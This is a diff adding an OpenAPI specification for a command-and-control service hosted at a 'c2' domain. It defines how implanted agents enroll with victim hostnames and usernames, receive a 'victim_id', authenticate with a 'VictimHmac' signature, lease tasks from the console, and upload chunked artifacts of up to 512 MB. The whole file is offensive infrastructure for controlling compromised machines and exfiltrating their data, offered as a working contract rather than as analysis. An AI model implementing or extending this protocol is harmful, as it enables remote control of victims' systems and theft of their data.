@@ -1,0 +1,174 @@
+openapi: 3.1.0
+info:
+  title: SPC Wire Contract
+  version: "1"
+  description: Frozen agent-to-console contract. See CONTRACT.md for auth canonicalisation.
+servers:
+  - url: https://c2.spc-cloud.net/api/v1
+components:
+  securitySchemes:
+    VictimHmac:
+      type: apiKey
+      in: header
+      name: X-Signature
+  schemas:
+    Error:
+      type: object
+      required: [error, message]
+      properties:
+        error: {type: string}
+        message: {type: string}
+        retry_after: {type: integer, minimum: 0}
+    EnrollRequest:
+      type: object
+      required: [build_token, build_id, hostname, os, arch, username, agent_version, profile]
+      properties:
+        build_token: {type: string, maxLength: 64}
+        build_id: {type: string, format: uuid}
+        hostname: {type: string, maxLength: 128}
+        os: {type: string, enum: [windows, linux, macos]}
+        os_version: {type: string, maxLength: 128}
+        arch: {type: string, enum: [x86_64, aarch64]}
+        username: {type: string, maxLength: 128}
+        agent_version: {type: string, maxLength: 32}
+        profile: {type: string, enum: [lite, full]}
+        modules: {type: array, items: {type: string}}
+    EnrollResponse:
+      type: object
+      required: [victim_id, device_token, server_time, heartbeat_interval, poll_interval, config_version]
+      properties:
+        victim_id: {type: string, format: uuid}
+        device_token: {type: string}
+        server_time: {type: integer}
+        heartbeat_interval: {type: integer}
+        poll_interval: {type: integer}
+        config_version: {type: integer}
+    Heartbeat:
+      type: object
+      required: [status, uptime_s, modules, counters, profile]
+      properties:
+        status: {type: string, enum: [ok, degraded]}
+        uptime_s: {type: integer}
+        modules: {type: object, additionalProperties: {type: string}}
+        counters: {type: object, additionalProperties: {type: integer}}
+        profile: {type: string, enum: [lite, full]}
+        pending_artifact: {type: [string, "null"]}
+        agent_version: {type: string}
+    Task:
+      type: object
+      required: [id, name, params, timeout_sec]
+      properties:
+        id: {type: string, format: uuid}
+        name: {type: string}
+        params: {type: object}
+        timeout_sec: {type: integer, minimum: 1, maximum: 3600}
+        not_before: {type: integer}
+    TaskResult:
+      type: object
+      required: [status, result]
+      properties:
+        status: {type: string, enum: [ok, error, cancelled]}
+        error: {type: [string, "null"]}
+        result: {type: object}
+        artifacts: {type: array, items: {type: object}}
+    UploadInit:
+      type: object
+      required: [container_version, total_size, chunk_count, sha256, module]
+      properties:
+        task_id: {type: [string, "null"]}
+        module: {type: string}
+        container_version: {type: integer, const: 1}
+        total_size: {type: integer, maximum: 536870912}
+        chunk_count: {type: integer, minimum: 1}
+        sha256: {type: string, pattern: '^[0-9a-f]{64}$'}
+paths:
+  /enroll:
+    post:
+      summary: Enroll a build instance
+      requestBody:
+        required: true
+        content: {application/json: {schema: {$ref: '#/components/schemas/EnrollRequest'}}}
+      responses:
+        "201": {description: Enrolled, content: {application/json: {schema: {$ref: '#/components/schemas/EnrollResponse'}}}}
+        "403": {description: build_revoked, content: {application/json: {schema: {$ref: '#/components/schemas/Error'}}}}
+        "409": {description: duplicate_or_conflict, content: {application/json: {schema: {$ref: '#/components/schemas/Error'}}}}
+  /hb:
+    post:
+      security: [{VictimHmac: []}]
+      requestBody:
+        required: true
+        content: {application/json: {schema: {$ref: '#/components/schemas/Heartbeat'}}}
+      responses:
+        "200": {description: OK}
+        "401": {description: bad_signature}
+        "410": {description: revoked}
+  /tasks:
+    get:
+      security: [{VictimHmac: []}]
+      parameters:
+        - {name: limit, in: query, schema: {type: integer, minimum: 1, maximum: 32}}
+      responses:
+        "200":
+          description: Leased tasks
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  tasks: {type: array, items: {$ref: '#/components/schemas/Task'}}
+  /tasks/{id}/result:
+    post:
+      security: [{VictimHmac: []}]
+      parameters: [{name: id, in: path, required: true, schema: {type: string, format: uuid}}]
+      requestBody:
+        required: true
+        content: {application/json: {schema: {$ref: '#/components/schemas/TaskResult'}}}
+      responses:
+        "200": {description: Recorded}
+        "409": {description: already_finished}
+        "422": {description: unknown_task}
+  /artifacts:
+    post:
+      security: [{VictimHmac: []}]
+      requestBody:
+        required: true
+        content: {application/json: {schema: {$ref: '#/components/schemas/UploadInit'}}}
+      responses:
+        "201": {description: Upload open}
+        "413": {description: payload_too_large}
+  /artifacts/{upload_id}:
+    get:
+      security: [{VictimHmac: []}]
+      parameters: [{name: upload_id, in: path, required: true, schema: {type: string, format: uuid}}]
+      responses:
+        "200": {description: Offset and state}
+        "410": {description: upload_expired}
+  /artifacts/{upload_id}/chunk:
+    post:
+      security: [{VictimHmac: []}]
+      parameters:
+        - {name: upload_id, in: path, required: true, schema: {type: string, format: uuid}}
+        - {name: offset, in: query, required: true, schema: {type: integer, minimum: 0}}
+      requestBody:
+        required: true
+        content: {application/octet-stream: {schema: {type: string, format: binary}}}
+      responses:
+        "200": {description: Stored or already present}
+        "409": {description: offset_mismatch}
+  /artifacts/{upload_id}/commit:
+    post:
+      security: [{VictimHmac: []}]
+      parameters: [{name: upload_id, in: path, required: true, schema: {type: string, format: uuid}}]
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              required: [sha256, chunk_count]
+              properties:
+                sha256: {type: string, pattern: '^[0-9a-f]{64}$'}
+                chunk_count: {type: integer}
+      responses:
+        "200": {description: Queued for processing}
+        "409": {description: hash_or_offset_mismatch}
